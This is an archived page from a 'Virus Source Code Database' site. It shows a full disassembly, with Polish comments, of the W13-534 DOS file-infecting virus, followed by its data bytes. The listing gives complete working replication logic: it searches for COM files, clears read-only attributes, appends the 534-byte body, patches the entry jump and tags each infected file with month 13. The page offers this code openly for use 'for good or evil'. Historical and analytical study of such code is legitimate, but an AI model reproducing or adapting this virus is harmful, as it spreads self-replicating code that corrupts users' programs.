<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: w13_534_asm</title>
<meta name="KEYWORDS" content="w13_534.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for w13_534.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="w13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_507_asm.php">w13_507_asm</a><br>
<a href="w13_534__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534__asm.php">w13_534__asm</a><br>
<a href="w13_534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534_asm.php">w13_534_asm</a><br>
<a href="w13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_asm.php">w13_asm</a><br>
<a href="walkabr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/walkabr_asm.php">walkabr_asm</a><br>
<a href="wanderer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wanderer_asm.php">wanderer_asm</a><br>
<a href="warzd00d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/warzd00d_asm.php">warzd00d_asm</a><br>
<a href="whale1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale1_asm.php">whale1_asm</a><br>
<a href="whale2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale2_asm.php">whale2_asm</a><br>
<a href="whale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale_asm.php">whale_asm</a><br>
<a href="wharps_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wharps_asm.php">wharps_asm</a><br>
<a href="whocares_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whocares_asm.php">whocares_asm</a><br>
<a href="why_win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why_win_asm.php">why_win_asm</a><br>
<a href="why-win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why-win_asm.php">why-win_asm</a><br>
<a href="wildthg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthg2_asm.php">wildthg2_asm</a><br>
<a href="wildthng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthng_asm.php">wildthng_asm</a><br>
<a href="wonder_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wonder_c.php">wonder_c</a><br>
<a href="wvir14a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14a_asm.php">wvir14a_asm</a><br>
<a href="wvir14_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14_asm.php">wvir14_asm</a><br>
<a href="ww_217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww_217_asm.php">ww_217_asm</a><br>
<a href="ww-217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww-217_asm.php">ww-217_asm</a><br>
<a href="ww217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww217_asm.php">ww217_asm</a><br>
<a href="wwt_01_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_01_asm.php">wwt_01_asm</a><br>
<a href="wwt_02_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_02_asm.php">wwt_02_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

                                    WIRUS 002

   Ponißszy wirus nie dokonuje praktycznie ßadnych istotnych szk¢d. Powiela sië 
w katalogu aktualnym lub gí¢wnym. Atakuje jedynie pliki typu COM. Po doklejeniu 
sië do ko§ca programu zmienia datë jego ostatniej modyfikacji podajÜc jako numer
miesiÜca liczbë 13. Kaßdy plik jest atakowany co najwyßej raz.

04EE 50            PUSH    AX
04EF BE5306        MOV     SI,0653     ; díugoûç zainfekowanego pliku - 3
04F2 8BD6          MOV     DX,SI       ; zarazem miejsce przechowania jego
04F4 81C60000      ADD     SI,0000     ; pierwszych trzech bajt¢w
04F8 FC            CLD
04F9 B90300        MOV     CX,0003     ; odtworzenie pierwszych trzech
04FC BF0001        MOV     DI,0100     ; bajt¢w zainfekowanego pliku
04FF F3            REPZ
0500 A4            MOVSB
0501 8BFA          MOV     DI,DX       ; pierwszy wolny bajt za programem
0503 B430          MOV     AH,30       
0505 CD21          INT     21          ; Get DOS version
0507 3C00          CMP     AL,00
0509 7503          JNZ     050E        ; wersja >= 2.00

050B E93F01        JMP     064D        ; nie ruszaj wersji 1.xx

050E BA2C00        MOV     DX,002C
0511 03D7          ADD     DX,DI       ; DX := 67F
0513 8BDA          MOV     BX,DX       ; nowy adres DTA
0515 B41A          MOV     AH,1A       ; Set DTA adress
0517 CD21          INT     21          ; DS:DX adres DTA

0519 BD0000        MOV     BP,0000     ; Flaga 'pierwsza pr¢ba' ?
051C 8BD7          MOV     DX,DI
051E 81C20700      ADD     DX,0007     ; adres ????????COM

0522 B90300        MOV     CX,0003     ; atrybuty pliku Read Only, Hiden
0525 B44E          MOV     AH,4E       ; Find First
0527 CD21          INT     21
0529 E90400        JMP     0530

052C B44F          MOV     AH,4F       ; Find Next
052E CD21          INT     21

0530 7315          JAE     0547        ; znaleziono plik typu COM

0532 3C12          CMP     AL,12
0534 7403          JZ      0539        ; nie ma wiëcej takich plik¢w

0536 E90D01        JMP     0646        ; koniec

0539 83FDFF        CMP     BP,-01      ; flaga?
053C 7503          JNZ     0541

053E E90501        JMP     0646        ; koniec

0541 4A            DEC     DX
0542 BDFFFF        MOV     BP,FFFF     ; Znacznik, ße to juß ostatnia pr¢ba?
0545 EBDB          JMP     0522        ; szukaj nastëpnego pliku typu COM

0547 8B4F18        MOV     CX,[BX+18]  ; Data znalezionego pliku
054A 81E1E001      AND     CX,01E0     ; wytnij miesiÜc
054E 81F9A001      CMP     CX,01A0     ; przyr¢wnaj do 13
0552 74D8          JZ      052C        ; szukaj dalszych plik¢w COM

0554 817F1A00FA    CMP     WORD PTR [BX+1A],FA00 ; oszczëd¶ pliki díußsze od
0559 77D1          JA      052C        ; 64000 i szukaj dalszych plik¢w COM

055B 817F1A0001    CMP     WORD PTR [BX+1A],0100 ; oszczëd¶ pliki kr¢tsze od
0560 72CA          JB      052C        ; 256 i szukaj dalszych plik¢w COM

0562 57            PUSH    DI          ; przechowaj adres DTA
0563 8BF3          MOV     SI,BX       ; adres DTA do SI
0565 83C61E        ADD     SI,+1E      ; nazwa wczytanego pliku
0568 81C71400      ADD     DI,0014
056C 83FDFF        CMP     BP,-01      ; ostatnie podejûcie?
056F 7503          JNZ     0574        ; tak

0571 B05C          MOV     AL,5C       ; '\', copiuj ASCIIZ ía§cuch
0573 AA            STOSB               ; AL --> ES:DI, DI := DI + 1
0574 AC            LODSB               ; DS:SI --> AL, SI := SI + 1
0575 AA            STOSB               ; AL --> ES:DI, DI := DI + 1
0576 3C00          CMP     AL,00
0578 75FA          JNZ     0574

057A 5F            POP     DI          ; odtw¢rz adres DTA
057B 8BD7          MOV     DX,DI
057D 81C21400      ADD     DX,0014     ; DS:DX nazwa pliku
0581 B80043        MOV     AX,4300     ; Get File Attribute
0584 CD21          INT     21

0586 898D2200      MOV     [DI+0022],CX  ; przechowaj atrybuty pliku
058A 81E1FEFF      AND     CX,FFFE     ; wyíÜcz Read Only
058E 8BD7          MOV     DX,DI
0590 81C21400      ADD     DX,0014
0594 B80143        MOV     AX,4301     ; Set File Attribute
0597 CD21          INT     21

0599 8BD7          MOV     DX,DI
059B 81C21400      ADD     DX,0014     ; adres ASCIIZ napisu (nazwa pliku)
059F B8023D        MOV     AX,3D02     ; tryb Read/Write
05A2 CD21          INT     21          ; Open File
05A4 7303          JAE     05A9        ; operacja udana

05A6 E99400        JMP     063D        ; fiasko, koniec

05A9 8BD8          MOV     BX,AX       ; Get File's Data and Time (nr Handle)
05AB B80057        MOV     AX,5700
05AE CD21          INT     21

05B0 898D2400      MOV     [DI+0024],CX   ; przechowaj czas
05B4 89952600      MOV     [DI+0026],DX   ; przechowaj datë
05B8 B43F          MOV     AH,3F       ; Read From File
05BA B90300        MOV     CX,0003     ; 3 bajty
05BD 8BD7          MOV     DX,DI
05BF 81C20000      ADD     DX,0000     ; DS:DX adres bufora
05C3 CD21          INT     21
05C5 7303          JAE     05CA        ; operacja udana

05C7 E95A00        JMP     0624        ; koniec

05CA 3D0300        CMP     AX,0003     ; kontrola liczby wczytanych bajt¢w
05CD 7555          JNZ     0624        ;  <> 3 koniec

05CF B80242        MOV     AX,4202     ; Move File Pointer (na koniec)
05D2 B90000        MOV     CX,0000     ; CX:DX offset w bajtach
05D5 8BD1          MOV     DX,CX       ; (32 bitowa liczba)
05D7 CD21          INT     21      
05D9 2D0300        SUB     AX,0003     ; DX:AX nowy (aktualny offset)
05DC 89850400      MOV     [DI+0004],AX  ; przechowaj
05E0 B96501        MOV     CX,0165
05E3 83FA00        CMP     DX,+00      ; díugoûç plku (bardziej znaczÜce síowo)
05E6 753C          JNZ     0624        ; koniec

05E8 8BD7          MOV     DX,DI
05EA 2BF9          SUB     DI,CX
05EC 83C702        ADD     DI,+02
05EF 050301        ADD     AX,0103
05F2 03C1          ADD     AX,CX
05F4 8905          MOV     [DI],AX
05F6 B440          MOV     AH,40       ; Write To File
05F8 8BFA          MOV     DI,DX
05FA 2BD1          SUB     DX,CX       ; DS:DX adres bufora
05FC B91602        MOV     CX,0216     ; díugoûç wirusa (534 bajty)
05FF CD21          INT     21
0601 7303          JAE     0606

0603 E91E00        JMP     0624        ; koniec

0606 3D1602        CMP     AX,0216     ; kontrola liczby przesíanych bajt¢w
0609 7519          JNZ     0624

060B B80042        MOV     AX,4200     ; Move File Pointer
060E B90000        MOV     CX,0000
0611 8BD1          MOV     DX,CX
0613 CD21          INT     21          ; przesu§ sië na poczÜtek pliku
0615 720D          JB      0624        ; jeûli jakiû bíÜd to koniec

0617 B440          MOV     AH,40       ; Write To File
0619 B90300        MOV     CX,0003     ; trzy pierwsze bajty bajty
061C 8BD7          MOV     DX,DI
061E 81C20300      ADD     DX,0003
0622 CD21          INT     21

0624 8B8D2400      MOV     CX,[DI+0024]  ; odtw¢rz czas
0628 8B952600      MOV     DX,[DI+0026]  ; odtw¢rz datë
062C 81E21FFE      AND     DX,FE1F     ; modyfikuj miesiÜc
0630 81CAA001      OR      DX,01A0     ; miesiÜc := 13
0634 B80157        MOV     AX,5701     ; Set File's Date and Time
0637 CD21          INT     21
0639 B43E          MOV     AH,3E       ; Close a File Handle (nr w BX)
063B CD21          INT     21

; bíÜd w kodzie, powinno byç MOV AX,4301  ; set file attribute

063D B80043        MOV     AX,4300     ; Get File Attribute
0640 8B8D2200      MOV     CX,[DI+0022]  ; odtw¢rz atrybuty zaraßanego pliku
0644 CD21          INT     21

0646 BA8000        MOV     DX,0080     ; przywr¢ç oryginalne DTA
0649 B41A          MOV     AH,1A       ; Set DTA adres
064B CD21          INT     21
064D 58            POP     AX          ; koniec
064E BF0001        MOV     DI,0100     ; oddaj sterowanie do programu
0651 57            PUSH    DI
0652 C3            RET

0653           E9 8E 01 E9 EB-03 5C 3F 3F 3F 3F 3F 3F      i..ik.\??????
0660  3F 3F 2E 43 4F 4D 00 43-4F 4C 4F 52 2E 43 4F 4D   ??.COM.COLOR.COM
0670  00 4F 4D 00 00 20 00 00-C0 21 0C 00 00 00 00
067F                                                    01   .OM.. ..@!......
0680  3F 3F 3F 3F 3F 3F 3F 3F-43 4F 4D 03 0A 00 00 00   ????????COM.....
0690  00 00 00 00 20 00 C0 21-0C EE 03 00 00 43 4F 4C   .... .@!.n...COL
06A0  4F 52 2E 43 4F 4D 00 4D-00 00 6F 73 6F 66 74 79   OR.COM.M..osofty
06B0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79   right Microsofty
06C0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79   right Microsofty
06D0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79   right Microsofty
06E0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79   right Microsofty
06F0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 20   right Microsoft
0700  31 39 38 38                                       1988 


</textarea></td></tr></table></body></html>
